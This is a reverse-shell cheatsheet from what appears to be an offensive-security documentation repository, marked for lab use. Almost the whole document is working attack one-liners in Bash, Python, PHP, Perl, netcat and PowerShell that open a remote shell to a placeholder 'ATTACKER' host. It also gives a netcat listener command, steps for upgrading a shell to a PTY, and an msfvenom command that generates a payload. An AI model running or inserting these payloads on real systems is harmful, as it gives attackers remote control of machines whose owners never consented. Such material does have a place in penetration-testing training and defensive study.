<!-- SPDX-License-Identifier: GPL-3.0-or-later | Copyright (C) 2026 Nithees Narendra S -->
[Home](../README.md) › [Cheatsheets](README.md) › **Reverse Shell Cheatsheet**

# Reverse Shell Cheatsheet

> One-liners across languages plus stabilisation and catchers. Printable: use your browser's *Print → Save as PDF*.

_Domain: Offensive · Last updated 2026-08-13_

## Quick reference

This cheatsheet is a fast recall aid, not a tutorial — learn the concepts in the Manual, then keep this beside you while you work.

> Catch with `nc -lvnp 9001` (or `rlwrap nc` / pwncat). Lab use only.

## One-liners
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/9001 0>&1
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",9001));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
# PHP
php -r '$s=fsockopen("ATTACKER",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
# Perl
perl -e 'use Socket;$i="ATTACKER";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Netcat (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 9001 >/tmp/f
```

## PowerShell (Windows)
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

## Upgrade a dumb shell to a PTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
```
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=9001 -f elf -o s.elf` for a generated payload.

## Related

- [All cheatsheets](README.md)
- [Tools reference](../reference/tools/README.md)
- [Repository home](../README.md)

